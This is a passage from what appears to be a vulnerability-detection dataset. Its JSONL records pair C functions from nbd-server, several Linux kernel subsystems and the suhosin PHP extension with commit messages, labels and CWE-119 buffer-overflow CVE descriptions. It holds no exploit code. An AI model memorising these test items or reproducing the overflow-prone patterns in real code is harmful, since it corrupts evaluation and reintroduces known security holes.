magic.\");\n\t\tif (len > BUFSIZE - sizeof(struct nbd_reply))\n \t\t\terr(\"Request too big!\");\n #ifdef DODBG\n \t\tprintf(\"%s from %llu (%llu) len %d, \", request.type ? \"WRITE\" :\n\t\t\t\t\"READ\", (unsigned long long)request.from,\n\t\t\t\t(unsigned long long)request.from / 512, len);\n#endif\n\t\tmemcpy(reply.handle, request.handle, sizeof(reply.handle));\n\t\tif ((request.from + len) > (OFFT_MAX)) {\n\t\t\tDEBUG(\"[Number too large!]\");\n\t\t\tERROR(client, reply, EINVAL);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (((ssize_t)((off_t)request.from + len) > client->exportsize)) {\n\t\t\tDEBUG(\"[RANGE!]\");\n\t\t\tERROR(client, reply, EINVAL);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (request.type==NBD_CMD_WRITE) {\n\t\t\tDEBUG(\"wr: net->buf, \");\n\t\t\treadit(client->net, buf, len);\n\t\t\tDEBUG(\"buf->exp, \");\n\t\t\tif ((client->server->flags & F_READONLY) ||\n\t\t\t    (client->server->flags & F_AUTOREADONLY)) {\n\t\t\t\tDEBUG(\"[WRITE to READONLY!]\");\n\t\t\t\tERROR(client, reply, EPERM);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (expwrite(request.from, buf, len, client)) {\n\t\t\t\tDEBUG(\"Write failed: %m\" );\n\t\t\t\tERROR(client, reply, errno);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tSEND(client->net, reply);\n\t\t\tDEBUG(\"OK!\\n\");\n\t\t\tcontinue;\n\t\t}\n\t\t/* READ */\n\n\t\tDEBUG(\"exp->buf, \");\n\t\tif (expread(request.from, buf + sizeof(struct nbd_reply), len, client)) {\n\t\t\tDEBUG(\"Read failed: %m\");\n\t\t\tERROR(client, reply, errno);\n\t\t\tcontinue;\n\t\t}\n\n\t\tDEBUG(\"buf->net, \");\n\t\tmemcpy(buf, &reply, sizeof(struct nbd_reply));\n\t\twriteit(client->net, buf, len + sizeof(struct nbd_reply));\n\t\tDEBUG(\"OK!\\n\");\n\t}\n\treturn 0;\n}\n", "func_hash": 208511006621789243604207821580929935528, "file_name": "nbd-server.c", "file_hash": 215605186871532710415959471360452243779, "cwe": ["CWE-119"], "cve": "CVE-2011-0530", "cve_desc": "Buffer overflow in the mainloop function in nbd-server.c in the server in Network Block Device (nbd) before 2.9.20 might allow remote attackers to execute arbitrary code via a long request.  NOTE: this issue exists because of a CVE-2005-3534 regression.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-0530"}
{"idx": 158479, "project": "linux", "commit_id": "79549c6dfda0603dba9a70a53467ce62d9335c33", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/79549c6dfda0603dba9a70a53467ce62d9335c33", "commit_message": "cred: copy_process() should clear child->replacement_session_keyring\n\nkeyctl_session_to_parent(task) sets ->replacement_session_keyring,\nit should be processed and cleared by key_replace_session_keyring().\n\nHowever, this task can fork before it notices TIF_NOTIFY_RESUME and\nthe new child gets the bogus ->replacement_session_keyring copied by\ndup_task_struct(). This is obviously wrong and, if nothing else, this\nleads to put_cred(already_freed_cred).\n\nchange copy_creds() to clear this member. If copy_process() fails\nbefore this point the wrong ->replacement_session_keyring doesn't\nmatter, exit_creds() won't be called.\n\nCc: <stable@vger.kernel.org>\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: David Howells <dhowells@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "int copy_creds(struct task_struct *p, unsigned long clone_flags)\n{\n#ifdef CONFIG_KEYS\n\tstruct thread_group_cred *tgcred;\n#endif\n \tstruct cred *new;\n \tint ret;\n \n\tp->replacement_session_keyring = NULL;\n\n \tif (\n #ifdef CONFIG_KEYS\n \t\t!p->cred->thread_keyring &&\n#endif\n\t\tclone_flags & CLONE_THREAD\n\t    ) {\n\t\tp->real_cred = get_cred(p->cred);\n\t\tget_cred(p->cred);\n\t\talter_cred_subscribers(p->cred, 2);\n\t\tkdebug(\"share_creds(%p{%d,%d})\",\n\t\t       p->cred, atomic_read(&p->cred->usage),\n\t\t       read_cred_subscribers(p->cred));\n\t\tatomic_inc(&p->cred->user->processes);\n\t\treturn 0;\n\t}\n\n\tnew = prepare_creds();\n\tif (!new)\n\t\treturn -ENOMEM;\n\n\tif (clone_flags & CLONE_NEWUSER) {\n\t\tret = create_user_ns(new);\n\t\tif (ret < 0)\n\t\t\tgoto error_put;\n\t}\n\n\t/* cache user_ns in cred.  Doesn't need a refcount because it will\n\t * stay pinned by cred->user\n\t */\n\tnew->user_ns = new->user->user_ns;\n\n#ifdef CONFIG_KEYS\n\t/* new threads get their own thread keyrings if their parent already\n\t * had one */\n\tif (new->thread_keyring) {\n\t\tkey_put(new->thread_keyring);\n\t\tnew->thread_keyring = NULL;\n\t\tif (clone_flags & CLONE_THREAD)\n\t\t\tinstall_thread_keyring_to_cred(new);\n\t}\n\n\t/* we share the process and session keyrings between all the threads in\n\t * a process - this is slightly icky as we violate COW credentials a\n\t * bit */\n\tif (!(clone_flags & CLONE_THREAD)) {\n\t\ttgcred = kmalloc(sizeof(*tgcred), GFP_KERNEL);\n\t\tif (!tgcred) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto error_put;\n\t\t}\n\t\tatomic_set(&tgcred->usage, 1);\n\t\tspin_lock_init(&tgcred->lock);\n\t\ttgcred->process_keyring = NULL;\n\t\ttgcred->session_keyring = key_get(new->tgcred->session_keyring);\n\n\t\trelease_tgcred(new);\n\t\tnew->tgcred = tgcred;\n\t}\n#endif\n\n\tatomic_inc(&new->user->processes);\n\tp->cred = p->real_cred = get_cred(new);\n\talter_cred_subscribers(new, 2);\n\tvalidate_creds(new);\n\treturn 0;\n\nerror_put:\n\tput_cred(new);\n\treturn ret;\n}\n", "func_hash": 193438030228150908602383473129084673303, "file_name": "cred.c", "file_hash": 192217264892189979249448018287327016675, "cwe": ["CWE-119"], "cve": "CVE-2012-2745", "cve_desc": "The copy_creds function in kernel/cred.c in the Linux kernel before 3.3.2 provides an invalid replacement session keyring to a child process, which allows local users to cause a denial of service (panic) via a crafted application that uses the fork system call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2745"}
{"idx": 158515, "project": "suhosin", "commit_id": "73b1968ee30f6d9d2dae497544b910e68e114bfa", "project_url": "https://github.com/stefanesser/suhosin", "commit_url": "https://github.com/stefanesser/suhosin/commit/73b1968ee30f6d9d2dae497544b910e68e114bfa", "commit_message": "Fixed stack based buffer overflow in transparent cookie encryption (see separate advisory)", "target": 0, "func": " char *suhosin_encrypt_single_cookie(char *name, int name_len, char *value, int value_len, char *key TSRMLS_DC)\n {\n\tchar *buf, *buf2, *d, *d_url;\n\tint l;\n\n\tbuf = estrndup(name, name_len);\n\t\n \t\n \tname_len = php_url_decode(buf, name_len);\n\tnormalize_varname(buf);\n\tname_len = strlen(buf);\n \t\n \tif (SUHOSIN_G(cookie_plainlist)) {\n \t\tif (zend_hash_exists(SUHOSIN_G(cookie_plainlist), buf, name_len+1)) {\n encrypt_return_plain:\n\t\t\tefree(buf);\n \t\t\treturn estrndup(value, value_len);\n \t\t}\n \t} else if (SUHOSIN_G(cookie_cryptlist)) {\n\t\tif (!zend_hash_exists(SUHOSIN_G(cookie_cryptlist), buf, name_len+1)) {\n\t\t\tgoto encrypt_return_plain;\n \t\t}\n \t}\n \t\n\tbuf2 = estrndup(value, value_len);\n \t\n \tvalue_len = php_url_decode(buf2, value_len);\n \t\n \td = suhosin_encrypt_string(buf2, value_len, buf, name_len, key TSRMLS_CC);\n \td_url = php_url_encode(d, strlen(d), &l);\n \tefree(d);\n\tefree(buf);\n\tefree(buf2);\n \treturn d_url;\n }\n", "func_hash": 131347476304509844742823814818049939285, "file_name": "header.c", "file_hash": 86130229650536993826447685238882031430, "cwe": ["CWE-119"], "cve": "CVE-2012-0807", "cve_desc": "Stack-based buffer overflow in the suhosin_encrypt_single_cookie function in the transparent cookie-encryption feature in the Suhosin extension before 0.9.33 for PHP, when suhosin.cookie.encrypt and suhosin.multiheader are enabled, might allow remote attackers to execute arbitrary code via a long string that is used in a Set-Cookie HTTP header.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0807"}
{"idx": 158586, "project": "linux", "commit_id": "15291164b22a357cb211b618adfef4fa82fc0de3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/15291164b22a357cb211b618adfef4fa82fc0de3", "commit_message": "jbd2: clear BH_Delay & BH_Unwritten in journal_unmap_buffer\n\njournal_unmap_buffer()'s zap_buffer: code clears a lot of buffer head\nstate ala discard_buffer(), but does not touch _Delay or _Unwritten as\ndiscard_buffer() does.\n\nThis can be problematic in some areas of the ext4 code which assume\nthat if they have found a buffer marked unwritten or delay, then it's\na live one.  Perhaps those spots should check whether it is mapped\nas well, but if jbd2 is going to tear down a buffer, let's really\ntear it down completely.\n\nWithout this I get some fsx failures on sub-page-block filesystems\nup until v3.2, at which point 4e96b2dbbf1d7e81f22047a50f862555a6cb87cb\nand 189e868fa8fdca702eb9db9d8afc46b5cb9144c9 make the failures go\naway, because buried within that large change is some more flag\nclearing.  I still think it's worth doing in jbd2, since\n->invalidatepage leads here directly, and it's the right place\nto clear away these flags.\n\nSigned-off-by: Eric Sandeen <sandeen@redhat.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org", "target": 0, "func": "static int journal_unmap_buffer(journal_t *journal, struct buffer_head *bh)\n{\n\ttransaction_t *transaction;\n\tstruct journal_head *jh;\n\tint may_free = 1;\n\tint ret;\n\n\tBUFFER_TRACE(bh, \"entry\");\n\n\t/*\n\t * It is safe to proceed here without the j_list_lock because the\n\t * buffers cannot be stolen by try_to_free_buffers as long as we are\n\t * holding the page lock. --sct\n\t */\n\n\tif (!buffer_jbd(bh))\n\t\tgoto zap_buffer_unlocked;\n\n\t/* OK, we have data buffer in journaled mode */\n\twrite_lock(&journal->j_state_lock);\n\tjbd_lock_bh_state(bh);\n\tspin_lock(&journal->j_list_lock);\n\n\tjh = jbd2_journal_grab_journal_head(bh);\n\tif (!jh)\n\t\tgoto zap_buffer_no_jh;\n\n\t/*\n\t * We cannot remove the buffer from checkpoint lists until the\n\t * transaction adding inode to orphan list (let's call it T)\n\t * is committed.  Otherwise if the transaction changing the\n\t * buffer would be cleaned from the journal before T is\n\t * committed, a crash will cause that the correct contents of\n\t * the buffer will be lost.  On the other hand we have to\n\t * clear the buffer dirty bit at latest at the moment when the\n\t * transaction marking the buffer as freed in the filesystem\n\t * structures is committed because from that moment on the\n\t * buffer can be reallocated and used by a different page.\n\t * Since the block hasn't been freed yet but the inode has\n\t * already been added to orphan list, it is safe for us to add\n\t * the buffer to BJ_Forget list of the newest transaction.\n\t */\n\ttransaction = jh->b_transaction;\n\tif (transaction == NULL) {\n\t\t/* First case: not on any transaction.  If it\n\t\t * has no checkpoint link, then we can zap it:\n\t\t * it's a writeback-mode buffer so we don't care\n\t\t * if it hits disk safely. */\n\t\tif (!jh->b_cp_transaction) {\n\t\t\tJBUFFER_TRACE(jh, \"not on any transaction: zap\");\n\t\t\tgoto zap_buffer;\n\t\t}\n\n\t\tif (!buffer_dirty(bh)) {\n\t\t\t/* bdflush has written it.  We can drop it now */\n\t\t\tgoto zap_buffer;\n\t\t}\n\n\t\t/* OK, it must be in the journal but still not\n\t\t * written fully to disk: it's metadata or\n\t\t * journaled data... */\n\n\t\tif (journal->j_running_transaction) {\n\t\t\t/* ... and once the current transaction has\n\t\t\t * committed, the buffer won't be needed any\n\t\t\t * longer. */\n\t\t\tJBUFFER_TRACE(jh, \"checkpointed: add to BJ_Forget\");\n\t\t\tret = __dispose_buffer(jh,\n\t\t\t\t\tjournal->j_running_transaction);\n\t\t\tjbd2_journal_put_journal_head(jh);\n\t\t\tspin_unlock(&journal->j_list_lock);\n\t\t\tjbd_unlock_bh_state(bh);\n\t\t\twrite_unlock(&journal->j_state_lock);\n\t\t\treturn ret;\n\t\t} else {\n\t\t\t/* There is no currently-running transaction. So the\n\t\t\t * orphan record which we wrote for this file must have\n\t\t\t * passed into commit.  We must attach this buffer to\n\t\t\t * the committing transaction, if it exists. */\n\t\t\tif (journal->j_committing_transaction) {\n\t\t\t\tJBUFFER_TRACE(jh, \"give to committing trans\");\n\t\t\t\tret = __dispose_buffer(jh,\n\t\t\t\t\tjournal->j_committing_transaction);\n\t\t\t\tjbd2_journal_put_journal_head(jh);\n\t\t\t\tspin_unlock(&journal->j_list_lock);\n\t\t\t\tjbd_unlock_bh_state(bh);\n\t\t\t\twrite_unlock(&journal->j_state_lock);\n\t\t\t\treturn ret;\n\t\t\t} else {\n\t\t\t\t/* The orphan record's transaction has\n\t\t\t\t * committed.  We can cleanse this buffer */\n\t\t\t\tclear_buffer_jbddirty(bh);\n\t\t\t\tgoto zap_buffer;\n\t\t\t}\n\t\t}\n\t} else if (transaction == journal->j_committing_transaction) {\n\t\tJBUFFER_TRACE(jh, \"on committing transaction\");\n\t\t/*\n\t\t * The buffer is committing, we simply cannot touch\n\t\t * it. So we just set j_next_transaction to the\n\t\t * running transaction (if there is one) and mark\n\t\t * buffer as freed so that commit code knows it should\n\t\t * clear dirty bits when it is done with the buffer.\n\t\t */\n\t\tset_buffer_freed(bh);\n\t\tif (journal->j_running_transaction && buffer_jbddirty(bh))\n\t\t\tjh->b_next_transaction = journal->j_running_transaction;\n\t\tjbd2_journal_put_journal_head(jh);\n\t\tspin_unlock(&journal->j_list_lock);\n\t\tjbd_unlock_bh_state(bh);\n\t\twrite_unlock(&journal->j_state_lock);\n\t\treturn 0;\n\t} else {\n\t\t/* Good, the buffer belongs to the running transaction.\n\t\t * We are writing our own transaction's data, not any\n\t\t * previous one's, so it is safe to throw it away\n\t\t * (remember that we expect the filesystem to have set\n\t\t * i_size already for this truncate so recovery will not\n\t\t * expose the disk blocks we are discarding here.) */\n\t\tJ_ASSERT_JH(jh, transaction == journal->j_running_transaction);\n\t\tJBUFFER_TRACE(jh, \"on running transaction\");\n\t\tmay_free = __dispose_buffer(jh, transaction);\n\t}\n\nzap_buffer:\n\tjbd2_journal_put_journal_head(jh);\nzap_buffer_no_jh:\n\tspin_unlock(&journal->j_list_lock);\n\tjbd_unlock_bh_state(bh);\n\twrite_unlock(&journal->j_state_lock);\nzap_buffer_unlocked:\n\tclear_buffer_dirty(bh);\n\tJ_ASSERT_BH(bh, !buffer_jbddirty(bh));\n \tclear_buffer_mapped(bh);\n \tclear_buffer_req(bh);\n \tclear_buffer_new(bh);\n\tclear_buffer_delay(bh);\n\tclear_buffer_unwritten(bh);\n \tbh->b_bdev = NULL;\n \treturn may_free;\n }\n", "func_hash": 239508390190332514870287981493186722846, "file_name": "transaction.c", "file_hash": 312279320265495413761314436998558776188, "cwe": ["CWE-119"], "cve": "CVE-2011-4086", "cve_desc": "The journal_unmap_buffer function in fs/jbd2/transaction.c in the Linux kernel before 3.3.1 does not properly handle the _Delay and _Unwritten buffer head states, which allows local users to cause a denial of service (system crash) by leveraging the presence of an ext4 filesystem that was mounted with a journal.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4086"}
{"idx": 158588, "project": "linux", "commit_id": "c85ce65ecac078ab1a1835c87c4a6319cf74660a", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c85ce65ecac078ab1a1835c87c4a6319cf74660a", "commit_message": "b43: allocate receive buffers big enough for max frame len + offset\n\nOtherwise, skb_put inside of dma_rx can fail...\n\n\thttps://bugzilla.kernel.org/show_bug.cgi?id=32042\n\nSigned-off-by: John W. Linville <linville@tuxdriver.com>\nAcked-by: Larry Finger <Larry.Finger@lwfinger.net>\nCc: stable@kernel.org", "target": 0, "func": "static void dma_rx(struct b43_dmaring *ring, int *slot)\n{\n\tconst struct b43_dma_ops *ops = ring->ops;\n\tstruct b43_dmadesc_generic *desc;\n\tstruct b43_dmadesc_meta *meta;\n\tstruct b43_rxhdr_fw4 *rxhdr;\n\tstruct sk_buff *skb;\n\tu16 len;\n\tint err;\n\tdma_addr_t dmaaddr;\n\n\tdesc = ops->idx2desc(ring, *slot, &meta);\n\n\tsync_descbuffer_for_cpu(ring, meta->dmaaddr, ring->rx_buffersize);\n\tskb = meta->skb;\n\n\trxhdr = (struct b43_rxhdr_fw4 *)skb->data;\n\tlen = le16_to_cpu(rxhdr->frame_len);\n\tif (len == 0) {\n\t\tint i = 0;\n\n\t\tdo {\n\t\t\tudelay(2);\n\t\t\tbarrier();\n\t\t\tlen = le16_to_cpu(rxhdr->frame_len);\n\t\t} while (len == 0 && i++ < 5);\n\t\tif (unlikely(len == 0)) {\n\t\t\tdmaaddr = meta->dmaaddr;\n\t\t\tgoto drop_recycle_buffer;\n\t\t}\n\t}\n\tif (unlikely(b43_rx_buffer_is_poisoned(ring, skb))) {\n\t\t/* Something went wrong with the DMA.\n\t\t * The device did not touch the buffer and did not overwrite the poison. */\n\t\tb43dbg(ring->dev->wl, \"DMA RX: Dropping poisoned buffer.\\n\");\n \t\tdmaaddr = meta->dmaaddr;\n \t\tgoto drop_recycle_buffer;\n \t}\n\tif (unlikely(len + ring->frameoffset > ring->rx_buffersize)) {\n \t\t/* The data did not fit into one descriptor buffer\n \t\t * and is split over multiple buffers.\n \t\t * This should never happen, as we try to allocate buffers\n\t\t * big enough. So simply ignore this packet.\n\t\t */\n\t\tint cnt = 0;\n\t\ts32 tmp = len;\n\n\t\twhile (1) {\n\t\t\tdesc = ops->idx2desc(ring, *slot, &meta);\n\t\t\t/* recycle the descriptor buffer. */\n\t\t\tb43_poison_rx_buffer(ring, meta->skb);\n\t\t\tsync_descbuffer_for_device(ring, meta->dmaaddr,\n\t\t\t\t\t\t   ring->rx_buffersize);\n\t\t\t*slot = next_slot(ring, *slot);\n\t\t\tcnt++;\n\t\t\ttmp -= ring->rx_buffersize;\n\t\t\tif (tmp <= 0)\n\t\t\t\tbreak;\n\t\t}\n\t\tb43err(ring->dev->wl, \"DMA RX buffer too small \"\n\t\t       \"(len: %u, buffer: %u, nr-dropped: %d)\\n\",\n\t\t       len, ring->rx_buffersize, cnt);\n\t\tgoto drop;\n\t}\n\n\tdmaaddr = meta->dmaaddr;\n\terr = setup_rx_descbuffer(ring, desc, meta, GFP_ATOMIC);\n\tif (unlikely(err)) {\n\t\tb43dbg(ring->dev->wl, \"DMA RX: setup_rx_descbuffer() failed\\n\");\n\t\tgoto drop_recycle_buffer;\n\t}\n\n\tunmap_descbuffer(ring, dmaaddr, ring->rx_buffersize, 0);\n\tskb_put(skb, len + ring->frameoffset);\n\tskb_pull(skb, ring->frameoffset);\n\n\tb43_rx(ring->dev, skb, rxhdr);\ndrop:\n\treturn;\n\ndrop_recycle_buffer:\n\t/* Poison and recycle the RX buffer. */\n\tb43_poison_rx_buffer(ring, skb);\n\tsync_descbuffer_for_device(ring, dmaaddr, ring->rx_buffersize);\n}\n", "func_hash": 57346809163291589501075433785130252914, "file_name": "dma.c", "file_hash": 261830879301148322247416076881739498561, "cwe": ["CWE-119"], "cve": "CVE-2011-3359", "cve_desc": "The dma_rx function in drivers/net/wireless/b43/dma.c in the Linux kernel before 2.6.39 does not properly allocate receive buffers, which allows remote attackers to cause a denial of service (system crash) via a crafted frame.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3359"}
{"idx": 158589, "project": "linux", "commit_id": "c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae", "commit_message": "fuse: check size of FUSE_NOTIFY_INVAL_ENTRY message\n\nFUSE_NOTIFY_INVAL_ENTRY didn't check the length of the write so the\nmessage processing could overrun and result in a \"kernel BUG at\nfs/fuse/dev.c:629!\"\n\nReported-by: Han-Wen Nienhuys <hanwenn@gmail.com>\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\nCC: stable@kernel.org", "target": 0, "func": "static int fuse_notify_inval_entry(struct fuse_conn *fc, unsigned int size,\n\t\t\t\t   struct fuse_copy_state *cs)\n{\n\tstruct fuse_notify_inval_entry_out outarg;\n\tint err = -ENOMEM;\n\tchar *buf;\n\tstruct qstr name;\n\n\tbuf = kzalloc(FUSE_NAME_MAX + 1, GFP_KERNEL);\n\tif (!buf)\n\t\tgoto err;\n\n\terr = -EINVAL;\n\tif (size < sizeof(outarg))\n\t\tgoto err;\n\n\terr = fuse_copy_one(cs, &outarg, sizeof(outarg));\n\tif (err)\n\t\tgoto err;\n\n\terr = -ENAMETOOLONG;\n \tif (outarg.namelen > FUSE_NAME_MAX)\n \t\tgoto err;\n \n\terr = -EINVAL;\n\tif (size != sizeof(outarg) + outarg.namelen + 1)\n\t\tgoto err;\n\n \tname.name = buf;\n \tname.len = outarg.namelen;\n \terr = fuse_copy_one(cs, buf, outarg.namelen + 1);\n\tif (err)\n\t\tgoto err;\n\tfuse_copy_finish(cs);\n\tbuf[outarg.namelen] = 0;\n\tname.hash = full_name_hash(name.name, name.len);\n\n\tdown_read(&fc->killsb);\n\terr = -ENOENT;\n\tif (fc->sb)\n\t\terr = fuse_reverse_inval_entry(fc->sb, outarg.parent, &name);\n\tup_read(&fc->killsb);\n\tkfree(buf);\n\treturn err;\n\nerr:\n\tkfree(buf);\n\tfuse_copy_finish(cs);\n\treturn err;\n}\n", "func_hash": 278035628439275691104113509523122686714, "file_name": "dev.c", "file_hash": 218502694604823484599405881283163566522, "cwe": ["CWE-119"], "cve": "CVE-2011-3353", "cve_desc": "Buffer overflow in the fuse_notify_inval_entry function in fs/fuse/dev.c in the Linux kernel before 3.1 allows local users to cause a denial of service (BUG_ON and system crash) by leveraging the ability to mount a FUSE filesystem.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-3353"}
{"idx": 158695, "project": "linux", "commit_id": "cae13fe4cc3f24820ffb990c09110626837e85d4", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/cae13fe4cc3f24820ffb990c09110626837e85d4", "commit_message": "Fix for buffer overflow in ldm_frag_add not sufficient\n\nAs Ben Hutchings discovered [1], the patch for CVE-2011-1017 (buffer\noverflow in ldm_frag_add) is not sufficient.  The original patch in\ncommit c340b1d64000 (\"fs/partitions/ldm.c: fix oops caused by corrupted\npartition table\") does not consider that, for subsequent fragments,\npreviously allocated memory is used.\n\n[1] http://lkml.org/lkml/2011/5/6/407\n\nReported-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: Timo Warns <warns@pre-sense.de>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "static bool ldm_frag_add (const u8 *data, int size, struct list_head *frags)\n{\n\tstruct frag *f;\n\tstruct list_head *item;\n\tint rec, num, group;\n\n\tBUG_ON (!data || !frags);\n\n\tif (size < 2 * VBLK_SIZE_HEAD) {\n\t\tldm_error(\"Value of size is to small.\");\n\t\treturn false;\n\t}\n\n\tgroup = get_unaligned_be32(data + 0x08);\n\trec   = get_unaligned_be16(data + 0x0C);\n\tnum   = get_unaligned_be16(data + 0x0E);\n\tif ((num < 1) || (num > 4)) {\n\t\tldm_error (\"A VBLK claims to have %d parts.\", num);\n\t\treturn false;\n\t}\n\tif (rec >= num) {\n\t\tldm_error(\"REC value (%d) exceeds NUM value (%d)\", rec, num);\n\t\treturn false;\n\t}\n\n\tlist_for_each (item, frags) {\n\t\tf = list_entry (item, struct frag, list);\n\t\tif (f->group == group)\n\t\t\tgoto found;\n\t}\n\n\tf = kmalloc (sizeof (*f) + size*num, GFP_KERNEL);\n\tif (!f) {\n\t\tldm_crit (\"Out of memory.\");\n\t\treturn false;\n\t}\n\n\tf->group = group;\n\tf->num   = num;\n\tf->rec   = rec;\n\tf->map   = 0xFF << num;\n \n \tlist_add_tail (&f->list, frags);\n found:\n\tif (rec >= f->num) {\n\t\tldm_error(\"REC value (%d) exceeds NUM value (%d)\", rec, f->num);\n\t\treturn false;\n\t}\n\n \tif (f->map & (1 << rec)) {\n \t\tldm_error (\"Duplicate VBLK, part %d.\", rec);\n \t\tf->map &= 0x7F;\t\t\t/* Mark the group as broken */\n\t\treturn false;\n\t}\n\n\tf->map |= (1 << rec);\n\n\tdata += VBLK_SIZE_HEAD;\n\tsize -= VBLK_SIZE_HEAD;\n\n\tmemcpy (f->data+rec*(size-VBLK_SIZE_HEAD)+VBLK_SIZE_HEAD, data, size);\n\n\treturn true;\n}\n", "func_hash": 312950127537623365577828777607943036574, "file_name": "ldm.c", "file_hash": 193102196756441336769179572683907987665, "cwe": ["CWE-119"], "cve": "CVE-2011-2182", "cve_desc": "The ldm_frag_add function in fs/partitions/ldm.c in the Linux kernel before 2.6.39.1 does not properly handle memory allocation for non-initial fragments, which might allow local users to conduct buffer overflow attacks, and gain privileges or obtain sensitive information, via a crafted LDM partition table.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-1017.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2182"}
{"idx": 158721, "project": "linux", "commit_id": "7572777eef78ebdee1ecb7c258c0ef94d35bad16", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7572777eef78ebdee1ecb7c258c0ef94d35bad16", "commit_message": "fuse: verify ioctl retries\n\nVerify that the total length of the iovec returned in FUSE_IOCTL_RETRY\ndoesn't overflow iov_length().\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\nCC: Tejun Heo <tj@kernel.org>\nCC: <stable@kernel.org>         [2.6.31+]", "target": 0, "func": "long fuse_do_ioctl(struct file *file, unsigned int cmd, unsigned long arg,\n\t\t   unsigned int flags)\n{\n\tstruct fuse_file *ff = file->private_data;\n\tstruct fuse_conn *fc = ff->fc;\n\tstruct fuse_ioctl_in inarg = {\n\t\t.fh = ff->fh,\n\t\t.cmd = cmd,\n\t\t.arg = arg,\n\t\t.flags = flags\n\t};\n\tstruct fuse_ioctl_out outarg;\n\tstruct fuse_req *req = NULL;\n\tstruct page **pages = NULL;\n\tstruct page *iov_page = NULL;\n\tstruct iovec *in_iov = NULL, *out_iov = NULL;\n\tunsigned int in_iovs = 0, out_iovs = 0, num_pages = 0, max_pages;\n\tsize_t in_size, out_size, transferred;\n\tint err;\n\n\t/* assume all the iovs returned by client always fits in a page */\n\tBUILD_BUG_ON(sizeof(struct iovec) * FUSE_IOCTL_MAX_IOV > PAGE_SIZE);\n\n\terr = -ENOMEM;\n\tpages = kzalloc(sizeof(pages[0]) * FUSE_MAX_PAGES_PER_REQ, GFP_KERNEL);\n\tiov_page = alloc_page(GFP_KERNEL);\n\tif (!pages || !iov_page)\n\t\tgoto out;\n\n\t/*\n\t * If restricted, initialize IO parameters as encoded in @cmd.\n\t * RETRY from server is not allowed.\n\t */\n\tif (!(flags & FUSE_IOCTL_UNRESTRICTED)) {\n\t\tstruct iovec *iov = page_address(iov_page);\n\n\t\tiov->iov_base = (void __user *)arg;\n\t\tiov->iov_len = _IOC_SIZE(cmd);\n\n\t\tif (_IOC_DIR(cmd) & _IOC_WRITE) {\n\t\t\tin_iov = iov;\n\t\t\tin_iovs = 1;\n\t\t}\n\n\t\tif (_IOC_DIR(cmd) & _IOC_READ) {\n\t\t\tout_iov = iov;\n\t\t\tout_iovs = 1;\n\t\t}\n\t}\n\n retry:\n\tinarg.in_size = in_size = iov_length(in_iov, in_iovs);\n\tinarg.out_size = out_size = iov_length(out_iov, out_iovs);\n\n\t/*\n\t * Out data can be used either for actual out data or iovs,\n\t * make sure there always is at least one page.\n\t */\n\tout_size = max_t(size_t, out_size, PAGE_SIZE);\n\tmax_pages = DIV_ROUND_UP(max(in_size, out_size), PAGE_SIZE);\n\n\t/* make sure there are enough buffer pages and init request with them */\n\terr = -ENOMEM;\n\tif (max_pages > FUSE_MAX_PAGES_PER_REQ)\n\t\tgoto out;\n\twhile (num_pages < max_pages) {\n\t\tpages[num_pages] = alloc_page(GFP_KERNEL | __GFP_HIGHMEM);\n\t\tif (!pages[num_pages])\n\t\t\tgoto out;\n\t\tnum_pages++;\n\t}\n\n\treq = fuse_get_req(fc);\n\tif (IS_ERR(req)) {\n\t\terr = PTR_ERR(req);\n\t\treq = NULL;\n\t\tgoto out;\n\t}\n\tmemcpy(req->pages, pages, sizeof(req->pages[0]) * num_pages);\n\treq->num_pages = num_pages;\n\n\t/* okay, let's send it to the client */\n\treq->in.h.opcode = FUSE_IOCTL;\n\treq->in.h.nodeid = ff->nodeid;\n\treq->in.numargs = 1;\n\treq->in.args[0].size = sizeof(inarg);\n\treq->in.args[0].value = &inarg;\n\tif (in_size) {\n\t\treq->in.numargs++;\n\t\treq->in.args[1].size = in_size;\n\t\treq->in.argpages = 1;\n\n\t\terr = fuse_ioctl_copy_user(pages, in_iov, in_iovs, in_size,\n\t\t\t\t\t   false);\n\t\tif (err)\n\t\t\tgoto out;\n\t}\n\n\treq->out.numargs = 2;\n\treq->out.args[0].size = sizeof(outarg);\n\treq->out.args[0].value = &outarg;\n\treq->out.args[1].size = out_size;\n\treq->out.argpages = 1;\n\treq->out.argvar = 1;\n\n\tfuse_request_send(fc, req);\n\terr = req->out.h.error;\n\ttransferred = req->out.args[1].size;\n\tfuse_put_request(fc, req);\n\treq = NULL;\n\tif (err)\n\t\tgoto out;\n\n\t/* did it ask for retry? */\n\tif (outarg.flags & FUSE_IOCTL_RETRY) {\n\t\tchar *vaddr;\n\n\t\t/* no retry if in restricted mode */\n\t\terr = -EIO;\n\t\tif (!(flags & 